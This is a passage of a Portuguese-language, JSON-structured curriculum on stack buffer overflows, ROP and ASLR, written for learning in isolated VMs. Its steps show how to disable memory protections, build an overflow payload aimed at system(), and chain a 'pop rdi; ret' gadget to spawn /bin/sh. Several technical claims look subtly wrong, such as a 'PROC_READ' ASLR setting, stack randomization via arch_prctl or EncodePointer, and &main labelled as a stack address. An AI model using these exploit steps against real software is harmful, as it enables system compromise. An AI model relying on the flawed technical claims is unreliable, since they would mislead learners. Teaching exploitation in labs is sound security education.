                                  "tips": "Use flags -fno-stack-protector -z execstack ao compilar para desabilitar proteções iniciais.",
                                  "learningObjective": "Compreender o mecanismo fundamental de buffer overflow na pilha.",
                                  "commonMistakes": "Confundir heap overflow com stack overflow; ignorar alinhamento de memória."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o Papel dos Endereços Fixos em Ataques",
                                  "subSteps": [
                                    "Defina endereços fixos: localizações previsíveis na memória sem ASLR ativado.",
                                    "Discuta como atacantes usam ferramentas como objdump ou gdb para encontrar endereços de funções como system() ou /bin/sh.",
                                    "Compare cenários com e sem ASLR: predictability vs. aleatoriedade.",
                                    "Estude exemplos históricos onde endereços fixos facilitaram exploits.",
                                    "Simule em um ambiente controlado: encontre endereço fixo de uma função em um binário."
                                  ],
                                  "verification": "Liste 3 endereços fixos de um binário desprotegido usando objdump e explique seu uso em um exploit.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Binário vulnerável compilado sem ASLR, objdump, gdb, documentação de ASLR.",
                                  "tips": "Execute 'cat /proc/sys/kernel/randomize_va_space' para verificar status de ASLR no sistema.",
                                  "learningObjective": "Reconhecer como endereços fixos tornam exploits determinísticos.",
                                  "commonMistakes": "Assumir que ASLR está sempre ativo; confundir ASLR com NX bit."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar e Analisar Exemplo de Buffer Overflow com Endereços Fixos",
                                  "subSteps": [
                                    "Escreva um programa C vulnerável com strcpy em buffer pequeno.",
                                    "Compile sem proteções e use gdb para encontrar endereço fixo do shellcode ou system().",
                                    "Crie payload: junk + return address fixo apontando para shellcode.",
                                    "Execute o exploit: injete payload via input e observe controle de fluxo hijack.",
                                    "Documente o antes/depois da pilha com screenshots do gdb."
                                  ],
                                  "verification": "Demonstre o exploit funcionando, retornando shell, e desabilite para mostrar falha sem endereço correto.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Código fonte C, Python para gerar payload, gdb, netcat para teste de shell.",
                                  "tips": "Use pattern_create do Metasploit para calcular offset exato do return address.",
                                  "learningObjective": "Construir e depurar um exploit buffer overflow dependente de endereços fixos.",
                                  "commonMistakes": "Offset incorreto no payload; esquecer de alinhar para 4/8 bytes."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Introduzir ROP e Dependência em Endereços Conhecidos",
                                  "subSteps": [
                                    "Explique ROP: chain de 'gadgets' terminando em ret, usando código existente.",
                                    "Identifique gadgets com ROPgadget ou ropper em binários sem ASLR.",
                                    "Construa chain ROP simples: pop rdi; ret + endereço de system + /bin/sh.",
                                    "Adapte exploit de buffer overflow para ROP chain com endereços fixos.",
                                    "Teste em ambiente com NX ativado, mostrando bypass parcial via ROP."
                                  ],
                                  "verification": "Gere e execute uma chain ROP que chama system('/bin/sh'), capturando output.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "ROPgadget tool, binário com símbolos, gdb-peda plugin para visualização.",
                                  "tips": "Procure gadgets comuns como 'pop rdi; ret' que são reutilizáveis.",
                                  "learningObjective": "Dominar ROP como evolução de exploits com endereços fixos.",
                                  "commonMistakes": "Gadgets desalinhados; ignorar convenções de calling (ex: argumentos em registradores)."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar Impacto na Integridade do Controle de Fluxo",
                                  "subSteps": [
                                    "Defina integridade de controle de fluxo (CFI): execução apenas de caminhos legítimos.",
                                    "Descreva como buffer overflow/ROP quebra CFI via return address overwrite.",
                                    "Discuta mitigações: ASLR, Canary, NX, CFI (ex: Control-Flow Integrity).",
                                    "Compare exploits bem-sucedidos pré-ASLR vs. falhas pós-ASLR.",
                                    "Escreva relatório resumindo impactos e defesas."
                                  ],
                                  "verification": "Redija parágrafo explicando como endereços fixos violam CFI, com exemplo.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Artigos sobre CFI (Microsoft, LLVM), vulnerabilidades CVE históricas.",
                                  "tips": "Relacione com ataques reais como Stagefright ou Heartbleed para contexto.",
                                  "learningObjective": "Avaliar consequências de exploits e necessidade de proteções como ASLR.",
                                  "commonMistakes": "Subestimar ROP como 'apenas para experts'; ignorar evoluções como JOP/COP."
                                }
                              ],
                              "practicalExample": "Em um programa C sem ASLR: buffer[64] com strcpy. Atacante usa gdb para achar endereço de system() em 0x401146. Payload: 64*'A' + 0x401146. Execução dá shell, hijackando fluxo para system('/bin/sh'). Com ROP: chain pop rdi (0x401282); system (0x401146); /bin/sh address.",
                              "finalVerifications": [
                                "Explica buffer overflow e ROP com endereços fixos em termos precisos.",
                                "Identifica endereços fixos em binário usando ferramentas como objdump/gdb.",
                                "Executa exploit funcional em ambiente controlado.",
                                "Descreve impacto no controle de fluxo com diagrama.",
                                "Compara cenários com/sem ASLR.",
                                "Lista mitigações e seu efeito em exploits."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica nos conceitos de overflow e ROP (30%)",
                                "Qualidade e funcionalidade do exemplo prático/exploit (25%)",
                                "Profundidade na análise de impacto e mitigações (20%)",
                                "Clareza em explicações e diagramas (15%)",
                                "Uso correto de ferramentas e verificações (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/C++: gerenciamento de memória e ponteiros.",
                                "Arquitetura de Computadores: pilha, registradores e execução de instruções.",
                                "Matemática: cálculos de offset e alinhamento binário.",
                                "Ética e Direito: implicações legais de exploits e responsabilidade em cibersegurança."
                              ],
                              "realWorldApplication": "Exploits como o worm Morris (1988) usaram buffer overflow com endereços fixos em fingerd; ROP em ataques como Return-to-libc contra NX. Profissionais de pentest/red team usam isso para validar ASLR; desenvolvedores ativam ASLR/PIE para prevenir em apps reais como browsers e servers."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.4.1.3",
                            "name": "Analisar semântica de execução vulnerável",
                            "description": "Examinar a semântica de execução de programas para mapear regiões de memória (stack, heap, bibliotecas) e prever endereços em cenários sem proteções.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender semântica de execução e layout de memória básico",
                                  "subSteps": [
                                    "Estude a semântica de execução de programas em linguagem assembly ou C, focando em chamadas de função e alocação de memória.",
                                    "Identifique as regiões principais de memória: stack (LIFO para variáveis locais e chamadas), heap (alocação dinâmica), seção de código e bibliotecas.",
                                    "Revise o modelo de memória virtual sem proteções como ASLR, onde endereços são previsíveis.",
                                    "Analise diagramas de layout de memória de processos Linux/Windows.",
                                    "Pratique traçando o fluxo de execução de um programa hello world em assembly."
                                  ],
                                  "verification": "Crie um diagrama manual do layout de memória de um programa simples e explique verbalmente as regiões.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação de layout de memória ELF/PE",
                                    "Exemplos de código C simples",
                                    "Ferramenta de visualização como draw.io"
                                  ],
                                  "tips": [
                                    "Comece com programas estáticos sem bibliotecas dinâmicas para simplicidade.",
                                    "Use diagramas para visualizar o stack growing downward."
                                  ],
                                  "learningObjective": "Dominar os conceitos fundamentais de regiões de memória e fluxo de execução previsível sem ASLR.",
                                  "commonMistakes": [
                                    "Confundir stack com heap",
                                    "Ignorar o papel do linker na alocação de bibliotecas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compilar e inspecionar um programa vulnerável sem proteções",
                                  "subSteps": [
                                    "Escreva um programa C simples com buffer local no stack e função vulnerável a overflow.",
                                    "Compile sem ASLR e com símbolos de debug (-g -fno-stack-protector -z execstack).",
                                    "Use objdump ou readelf para inspecionar seções de memória e endereços base.",
                                    "Examine bibliotecas carregadas com ldd e note endereços fixos.",
                                    "Gere um core dump ou use strings para extrair endereços previsíveis."
                                  ],
                                  "verification": "Liste os endereços base de stack, heap e libc em uma tabela comparativa de múltiplas execuções.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "GCC compiler",
                                    "objdump/readelf",
                                    "ldd",
                                    "Código fonte exemplo com buffer overflow"
                                  ],
                                  "tips": [
                                    "Desative ASLR temporariamente com setarch -R ou echo 0 > /proc/sys/kernel/randomize_va_space.",
                                    "Compare dumps de múltiplas runs para confirmar previsibilidade."
                                  ],
                                  "learningObjective": "Inspecionar binários compilados para mapear endereços fixos em ausência de proteções.",
                                  "commonMistakes": [
                                    "Esquecer flags de compilação que ativam proteções",
                                    "Não verificar múltiplas execuções"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar análise dinâmica com debugger para mapear regiões",
                                  "subSteps": [
                                    "Inicie o programa em GDB e defina breakpoints em main, alocação heap (malloc) e chamadas de biblioteca.",
                                    "Use info proc mappings para visualizar regiões de memória em runtime.",
                                    "Trace o stack com bt e x/10x $rsp para examinar frames.",
                                    "Monitore heap com info inferiors e examine endereços pós-malloc/free.",
                                    "Registre endereços de funções libc como system() e preveja offsets relativos."
                                  ],
                                  "verification": "Produza um log GDB mostrando mapeamento de pelo menos 5 regiões com endereços exatos.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "GDB debugger",
                                    "Programa vulnerável compilado",
                                    "Referência GDB commands"
                                  ],
                                  "tips": [
                                    "Use 'vmmap' no GDB para visão geral rápida.",
                                    "Anote endereços em uma tabela para padrões recorrentes."
                                  ],
                                  "learningObjective": "Mapear dinamicamente regiões de memória durante execução e prever acessos.",
                                  "commonMistakes": [
                                    "Não pausar ASLR",
                                    "Confundir endereços virtuais com físicos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Prever endereços e simular exploração de vulnerabilidade",
                                  "subSteps": [
                                    "Baseado em análises anteriores, calcule offsets para overflow no stack para alcançar return address.",
                                    "Simule um payload que sobrescreve endereço de retorno para uma função libc conhecida.",
                                    "Teste a previsão enviando input malicioso e verificando crash em endereço esperado.",
                                    "Analise o core dump para confirmar controle de RIP/EIP no endereço previsto.",
                                    "Documente a cadeia de previsibilidade: compilação -> inspeção -> execução -> exploit."
                                  ],
                                  "verification": "Demonstre um exploit bem-sucedido que chama uma função em endereço previsto sem variação.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "GDB com core dumps",
                                    "Python para gerar payloads",
                                    "pwndbg ou gef para GDB melhorado"
                                  ],
                                  "tips": [
                                    "Use pattern_create para calcular offsets exatos.",
                                    "Teste em VM isolada para segurança."
                                  ],
                                  "learningObjective": "Prever e validar endereços para exploração em cenários sem proteções de memória.",
                                  "commonMistakes": [
                                    "Erros de alinhamento no payload",
                                    "Subestimar tamanho do stack frame"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile um programa C com buffer de 64 bytes na main: int main() { char buf[64]; gets(buf); }. Sem ASLR, o stack base é ~0x7fffffffd000. Overflow para retornar a system() em ~0x7ffff7a05b90 (previsível via info proc mappings). Gere payload para chamar system('/bin/sh').",
                              "finalVerifications": [
                                "Descreva corretamente stack, heap e regiões de bibliotecas em um diagrama.",
                                "Preveja endereço de return em programa simples com precisão de ±0x1000.",
                                "Identifique endereços fixos em múltiplas execuções sem ASLR.",
                                "Simule overflow controlando EIP/RIP para gadget conhecido.",
                                "Explique impacto de ASLR na previsibilidade.",
                                "Analise core dump confirmando previsão."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento de regiões (90% cobertura).",
                                "Correção na previsão de endereços (erro < 1%).",
                                "Qualidade da análise GDB com logs detalhados.",
                                "Sucesso na simulação de exploit sem crashes inesperados.",
                                "Documentação clara de passos e previsões.",
                                "Identificação de pelo menos 3 erros comuns evitados."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender alocação de memória.",
                                "Arquitetura de Computadores: Modelo de memória virtual e paginacao.",
                                "Análise de Malware: Dissecção de binários maliciosos.",
                                "Engenharia Reversa: Uso de debuggers em exploits reais.",
                                "Sistemas Operacionais: Gerenciamento de processos e ASLR."
                              ],
                              "realWorldApplication": "Em pentests e CTFs, essa análise permite desenvolver exploits para binários legados sem ASLR, como em ataques ROP contra serviços web vulneráveis, identificando ROP chains em endereços fixos de libc para bypass de proteções mínimas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.4.2",
                        "name": "Mecanismo de Funcionamento do ASLR",
                        "description": "Detalhamento da randomização de endereços de memória em diferentes espaços (stack, heap, bibliotecas compartilhadas e executável) para mitigar previsibilidade.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.4.2.1",
                            "name": "Descrever randomização de espaços de memória",
                            "description": "Explicar como o ASLR randomiza bases de stack, heap, mmap e bibliotecas em sistemas operacionais como Linux e Windows, incluindo o uso de entropia do kernel.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Espaços de Memória em Processos",
                                  "subSteps": [
                                    "Identifique os principais espaços de memória: stack (para variáveis locais e chamadas de função), heap (para alocações dinâmicas), mmap (para mapeamentos de arquivos e memória compartilhada) e bibliotecas compartilhadas (como libc).",
                                    "Estude o layout padrão de memória em um processo ELF (Linux) usando ferramentas como 'readelf' ou 'objdump'.",
                                    "Compare layouts fixos vs. randomizados, notando endereços previsíveis em sistemas sem ASLR.",
                                    "Revise conceitos de virtual memory e page tables para contextualizar randomização.",
                                    "Anote diferenças entre user-space e kernel-space memory."
                                  ],
                                  "verification": "Desenhe um diagrama do layout de memória de um processo simples e rotule stack, heap, mmap e libs.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação kernel.org sobre virtual memory",
                                    "Ferramentas: readelf, gdb em uma VM Linux",
                                    "Exemplo binário simples compilado com gcc"
                                  ],
                                  "tips": "Use 'ldd' para ver dependências de bibliotecas e seus caminhos de mmap.",
                                  "learningObjective": "Entender a estrutura de espaços de memória para identificar pontos de randomização ASLR.",
                                  "commonMistakes": "Confundir stack com heap ou ignorar mmap para shared objects."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o Mecanismo ASLR no Linux",
                                  "subSteps": [
                                    "Verifique o status ASLR com 'cat /proc/sys/kernel/randomize_va_space' (níveis 0-3).",
                                    "Analise randomização de stack: offset aleatório na base do stack via arch_prctl(PR_SET_VMA).",
                                    "Estude heap randomização: brute offset via brk/sbrk com entropia de 28 bits.",
                                    "Examine mmap e libs: randomização parcial/full com ASLR nível 2/3, usando get_unmapped_area().",
                                    "Execute 'ldd' e 'cat /proc/<pid>/maps' em processos para observar endereços variados entre runs."
                                  ],
                                  "verification": "Execute um binário múltiplas vezes e compare /proc/<pid>/maps para confirmar variações de endereço.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "VM Ubuntu",
                                    "Comandos: cat /proc/<pid>/maps, sysctl kernel.randomize_va_space",
                                    "Kernel docs: Documentation/x86/aslr.rst"
                                  ],
                                  "tips": "Desative ASLR temporariamente com 'echo 0 > /proc/sys/kernel/randomize_va_space' para comparar.",
                                  "learningObjective": "Descrever como Linux randomiza cada espaço usando entropia do kernel.",
                                  "commonMistakes": "Assumir randomização total em nível 1; nível 1 só randomiza stack e libs parcialmente."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o ASLR no Windows",
                                  "subSteps": [
                                    "Ative ASLR via EMET ou compiler flags (/DYNAMICBASE).",
                                    "Estude stack: randomização via EncodePointer/DecodePointer com cookie por processo.",
                                    "Heap: randomização de low-fragmentation heap (LFH) e base heap via entropia de sessão.",
                                    "Mmap e DLLs: randomização de base de imagem (PIE-like) com 17-20 bits de entropia.",
                                    "Use Process Hacker ou !vadinfo no WinDbg para inspecionar regiões de memória randomizadas."
                                  ],
                                  "verification": "Compile um executável MSVC com ASLR e compare bases de DLLs em múltiplas execuções via Task Manager ou Process Explorer.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Windows VM",
                                    "Visual Studio ou MinGW",
                                    "Process Explorer (Sysinternals)",
                                    "MSDN: ASLR documentation"
                                  ],
                                  "tips": "Verifique 'Image base randomization' no PE header com CFF Explorer.",
                                  "learningObjective": "Comparar randomização ASLR em Windows com Linux, focando em entropia por sessão.",
                                  "commonMistakes": "Ignorar que Windows ASLR é opt-in para apps legados sem /DYNAMICBASE."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Entender o Papel da Entropia do Kernel",
                                  "subSteps": [
                                    "Explique fontes de entropia: /dev/urandom, RDRAND, interrupções de hardware e jiffies.",
                                    "No Linux, estude get_random_long() e csprng para seeds ASLR.",
                                    "No Windows, analise SystemFunction036 (RtlGenRandom) usando entropia de boot e user.",
                                    "Discuta limitações: entropia finita por boot (rebúte predictability em ataques).",
                                    "Simule bypass parcial medindo entropia disponível via /proc/sys/kernel/random/entropy_avail."
                                  ],
                                  "verification": "Escreva um relatório resumindo como entropia é colhida e aplicada em ASLR para stack/heap/mmap/libs.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Kernel source: crypto/rng.c",
                                    "WinDbg com símbolos",
                                    "Artigos: Phrack ASLR internals"
                                  ],
                                  "tips": "Use 'rngd' para melhorar pool de entropia em VMs pobres.",
                                  "learningObjective": "Explicar como entropia do kernel garante imprevisibilidade em ASLR.",
                                  "commonMistakes": "Confundir /dev/random (bloqueante) com /dev/urandom (não-bloqueante) para ASLR."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar e Comparar ASLR Cross-Platform",
                                  "subSteps": [
                                    "Compare bits de entropia: Linux (24-40 bits total), Windows (17-24 bits por região).",
                                    "Discuta bypasses comuns: info leaks via format strings ou side-channels.",
                                    "Crie tabela comparativa: stack/heap/mmap/libs em Linux vs Windows.",
                                    "Teste com ferramenta como checksec.sh ou EMET checker.",
                                    "Reflita sobre evoluções: KASLR (kernel ASLR) estendendo para kernel space."
                                  ],
                                  "verification": "Crie uma tabela Markdown comparando randomização por SO e espaço de memória.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "checksec.sh script",
                                    "Tabela em Google Docs ou Markdown",
                                    "Referências: PaX ASLR papers"
                                  ],
                                  "tips": "Foque em granularidade: full PIE vs partial ASLR.",
                                  "learningObjective": "Integrar conhecimentos para descrever ASLR holisticamente.",
                                  "commonMistakes": "Generalizar ASLR como 'totalmente aleatório'; é probabilístico."
                                }
                              ],
                              "practicalExample": "Compile um programa C simples com buffer overflow (ex: strcpy sem bounds). Execute sem ASLR (setarch -R) e encontre offset exato para shellcode. Reative ASLR e observe falhas repetidas devido a bases randomizadas de stack/heap, demonstrando proteção contra ROP.",
                              "finalVerifications": [
                                "Pode listar e descrever os 4 espaços randomizados pelo ASLR.",
                                "Explica diferenças de entropia e níveis em Linux (0-3).",
                                "Descreve mecanismos específicos de Windows ASLR (DynamicBase, etc.).",
                                "Identifica fontes de entropia kernel e limitações.",
                                "Compara efetividade cross-platform com exemplos.",
                                "Simula verificação via /proc/maps ou Process Explorer."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: Correção de termos como 'brk offset' vs 'stack canary'.",
                                "Profundidade: Inclui entropia bits e verificações práticas.",
                                "Clareza: Explicações passo-a-passo sem jargão excessivo.",
                                "Exemplos: Uso de ferramentas reais para demonstração.",
                                "Comparação: Destaca similaridades/diferenças Linux/Windows.",
                                "Aplicação: Liga a mitigações de exploits reais."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Virtual memory e page allocation.",
                                "Programação de Baixo Nível: Assembly para análise de exploits.",
                                "Criptografia: Geradores de números pseudo-aleatórios (CSPRNG).",
                                "Redes: Proteção contra remote code execution em serviços.",
                                "Matemática: Probabilidade em ataques de brute-force ASLR."
                              ],
                              "realWorldApplication": "ASLR previne exploits como buffer overflows em navegadores (Chrome sandbox) e servidores web (Apache), forçando atacantes a vazar endereços primeiro, aumentando complexidade de ataques zero-day em produção."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.4.1.1"
                            ]
                          },
                          {
                            "id": "10.1.1.4.2.2",
                            "name": "Diferenciar níveis de ASLR",
                            "description": "Comparar ASLR parcial (32-bit) e full ASLR (64-bit), incluindo configurações como PROC_READ e entropia de 8/14/24 bits, e verificar status com ferramentas como cat /proc/sys/kernel/randomize_va_space.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente e verificar status atual de ASLR",
                                  "subSteps": [
                                    "Instale uma máquina virtual Linux (ex: Ubuntu 64-bit).",
                                    "Abra o terminal e execute 'cat /proc/sys/kernel/randomize_va_space' para ver o valor atual (0, 1 ou 2).",
                                    "Verifique a arquitetura do sistema com 'uname -m' (i686 para 32-bit, x86_64 para 64-bit).",
                                    "Instale ferramentas como 'ldd' e 'gdb' com 'sudo apt update && sudo apt install build-essential gdb'.",
                                    "Crie um programa C simples para testar endereços de memória."
                                  ],
                                  "verification": "Output do comando cat mostra um valor entre 0-2 e uname confirma arquitetura.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Máquina virtual Ubuntu",
                                    "Terminal",
                                    "Editor de texto"
                                  ],
                                  "tips": "Use uma VM snapshot para reverter mudanças facilmente.",
                                  "learningObjective": "Configurar ambiente seguro para testes de ASLR e ler status inicial.",
                                  "commonMistakes": [
                                    "Executar como root sem necessidade",
                                    "Confundir arquitetura do host com guest",
                                    "Ignorar dependências de pacotes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Entender os níveis básicos de configuração de ASLR",
                                  "subSteps": [
                                    "Pesquise documentação: 0 = ASLR desabilitado; 1 = ASLR parcial/conservador; 2 = ASLR completo.",
                                    "Altere temporariamente com 'sudo sysctl kernel.randomize_va_space=0' e verifique com cat.",
                                    "Repita para valores 1 e 2, observando mudanças no output.",
                                    "Leia /proc/sys/kernel/randomize_va_space manpage com 'man proc'.",
                                    "Anote diferenças: nível 1 randomiza menos bits (tipicamente 8 bits para stack)."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito o significado de cada valor 0,1,2.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Terminal Linux",
                                    "Documentação kernel.org sobre ASLR"
                                  ],
                                  "tips": "Use 'echo valor | sudo tee /proc/sys/kernel/randomize_va_space' para alterações rápidas.",
                                  "learningObjective": "Identificar e alterar níveis básicos de ASLR via sysctl.",
                                  "commonMistakes": [
                                    "Confundir sysctl com echo direto",
                                    "Não usar sudo",
                                    "Alterações não persistirem após reboot"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Diferenciar ASLR parcial (32-bit) vs full ASLR (64-bit)",
                                  "subSteps": [
                                    "Compile um programa C que imprima endereço de variável stack e heap (use printf('%p')).",
                                    "Execute múltiplas vezes com ASLR=1 (parcial: ~8-14 bits de entropia, mais previsível em 32-bit).",
                                    "Mude para ASLR=2 (full: até 24-28 bits em 64-bit, alta entropia).",
                                    "Compare saídas: em 32-bit, partial é limitado pelo espaço de endereços; 64-bit full usa mais entropia.",
                                    "Use 'cat /proc/<pid>/maps' para ver randomização de bibliotecas."
                                  ],
                                  "verification": "Registre 5 execuções e mostre variação de endereços entre partial e full.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Código C de exemplo",
                                    "gdb para debug",
                                    "/proc filesystem"
                                  ],
                                  "tips": "Rode em loop com 'for i in {1..5}; do ./prog; done' para observar randomização.",
                                  "learningObjective": "Comparar entropia e previsibilidade entre 32-bit partial e 64-bit full.",
                                  "commonMistakes": [
                                    "Não recompilar após mudanças de ASLR",
                                    "Ignorar PID diferente em execuções",
                                    "Confundir stack com heap"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar configurações avançadas e PROC_READ",
                                  "subSteps": [
                                    "Estude entropia: 8 bits (baixo), 14 bits (médio), 24 bits (alto em full ASLR).",
                                    "Verifique PROC_READ: leia /proc/sys/kernel/randomize_va_space e correlacione com /proc/<pid>/status.",
                                    "Teste em 32-bit VM: partial limitado a ~8 bits devido a espaço endereçamento.",
                                    "Em 64-bit: full usa 24+ bits; use 'ldd ./prog' para ver bibliotecas randomizadas.",
                                    "Documente tabela comparativa: colunas para nível, bits entropia, 32/64-bit."
                                  ],
                                  "verification": "Crie tabela comparativa e demonstre com outputs reais.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "VM 32-bit opcional",
                                    "Tabela em Markdown ou planilha"
                                  ],
                                  "tips": "Para persistir: edite /etc/sysctl.conf com 'kernel.randomize_va_space=2'.",
                                  "learningObjective": "Analisar impacto de entropia e PROC_READ em diferentes arquiteturas.",
                                  "commonMistakes": [
                                    "Assumir entropia fixa sem testar",
                                    "Não diferenciar user vs kernel space",
                                    "Ler proc sem PID ativo"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma VM Ubuntu 64-bit, compile 'int main(){ printf(\"Stack: %p\\n\", &main); }', rode 10x com ASLR=1 (endereços variam pouco, ~14 bits) vs ASLR=2 (alta variação, 24+ bits). Use 'cat /proc/$(pidof prog)/maps' para ver mmap base randomizado apenas em full ASLR.",
                              "finalVerifications": [
                                "Explicar diferenças entre ASLR 1 (parcial, 8-14 bits) e 2 (full, 24 bits em 64-bit).",
                                "Mostrar output de 'cat /proc/sys/kernel/randomize_va_space' em configurações alteradas.",
                                "Comparar endereços de stack/heap em execuções múltiplas para 32 vs 64-bit.",
                                "Identificar limitações de entropia em 32-bit (PROC_READ mostra status).",
                                "Criar tabela resumindo níveis, entropia e arquiteturas.",
                                "Verificar randomização de bibliotecas com ldd em full ASLR."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de níveis 0,1,2 e entropia bits.",
                                "Evidências práticas: screenshots ou logs de comandos e outputs.",
                                "Correta diferenciação partial (32-bit conservador) vs full (64-bit alta entropia).",
                                "Uso correto de ferramentas como cat /proc e sysctl.",
                                "Tabela comparativa clara e completa.",
                                "Identificação de impactos em segurança (previsibilidade de exploits)."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Gerenciamento de memória virtual e syscalls.",
                                "Matemática: Conceitos de entropia e probabilidade em randomização.",
                                "Programação: Manipulação de ponteiros e endereços em C.",
                                "Hardware: Diferenças arquiteturais 32-bit vs 64-bit.",
                                "Redes: ASLR em proteção contra ataques remotos (ex: ROP em serviços)."
                              ],
                              "realWorldApplication": "Em servidores de produção (ex: web servers Apache), ativar full ASLR (nível 2) previne exploits de buffer overflow e ROP chains, tornando endereços imprevisíveis para atacantes, comum em ambientes cloud como AWS EC2."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.4.1.2"
                            ]
                          },
                          {
                            "id": "10.1.1.4.2.3",
                            "name": "Implementar e testar ASLR em ambiente controlado",
                            "description": "Compilar programas com ASLR ativado/desativado usando flags como -no-pie, executar com setarch -R para bypass temporário, e observar mudanças de endereços via gdb ou /proc/<pid>/maps.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente de teste controlado",
                                  "subSteps": [
                                    "Instale as ferramentas necessárias: gcc, gdb e utilitários do sistema em uma VM Linux (ex: Ubuntu).",
                                    "Verifique o status atual do ASLR com o comando 'cat /proc/sys/kernel/randomize_va_space' (deve ser 2 para full ASLR).",
                                    "Crie um programa C simples (hello.c) que imprima endereços de variáveis ou funções.",
                                    "Configure um diretório de trabalho dedicado e clone um repositório de exemplo se necessário.",
                                    "Desative temporariamente ASLR globalmente com 'echo 0 | sudo tee /proc/sys/kernel/randomize_va_space' para testes baseline."
                                  ],
                                  "verification": "Confirme instalação com 'gcc --version', 'gdb --version' e status ASLR alterado para 0.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "VM Linux (Ubuntu 22.04+)",
                                    "gcc",
                                    "gdb",
                                    "Editor de texto (vim/nano)"
                                  ],
                                  "tips": "Use uma VM isolada para evitar impactos no host; sempre reverta configurações ASLR após testes.",
                                  "learningObjective": "Configurar um ambiente Linux seguro e controlado para experimentos com ASLR.",
                                  "commonMistakes": [
                                    "Esquecer de usar sudo para alterar /proc/sys",
                                    "Não criar backup de configurações originais",
                                    "Usar ambiente de produção em vez de VM"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compilar e testar programa sem ASLR (ASLR desativado)",
                                  "subSteps": [
                                    "Compile o hello.c com flag -no-pie: 'gcc -no-pie -o hello_no_aslr hello.c'.",
                                    "Execute o programa múltiplas vezes e observe endereços fixos com 'gdb ./hello_no_aslr' e 'info proc mappings' ou 'cat /proc/$!/maps'.",
                                    "Registre os endereços base da stack, heap e bibliotecas em runs repetidos.",
                                    "Anote que os endereços são previsíveis e idênticos entre execuções.",
                                    "Saia do gdb e limpe processos com 'pkill hello_no_aslr'."
                                  ],
                                  "verification": "Endereços de memória (ex: main function) são os mesmos em 5 execuções consecutivas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "hello.c",
                                    "gcc",
                                    "gdb"
                                  ],
                                  "tips": "Use 'start' no gdb para executar diretamente; compare maps com diff para precisão.",
                                  "learningObjective": "Demonstrar execução determinística de endereços sem randomização.",
                                  "commonMistakes": [
                                    "Compilar com PIE padrão ativado",
                                    "Não registrar múltiplos runs",
                                    "Ignorar ASLR global ainda ativo"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Compilar e testar programa com ASLR ativado",
                                  "subSteps": [
                                    "Reative ASLR global: 'echo 2 | sudo tee /proc/sys/kernel/randomize_va_space'.",
                                    "Compile normalmente (com PIE): 'gcc -pie -fPIE -o hello_aslr hello.c' ou use -no-pie e confie no ASLR do kernel.",
                                    "Execute múltiplas vezes via gdb ou /proc/<pid>/maps e observe variações nos endereços base.",
                                    "Meça a randomização (ex: offset de 1MB+ entre runs) para stack, heap e libs.",
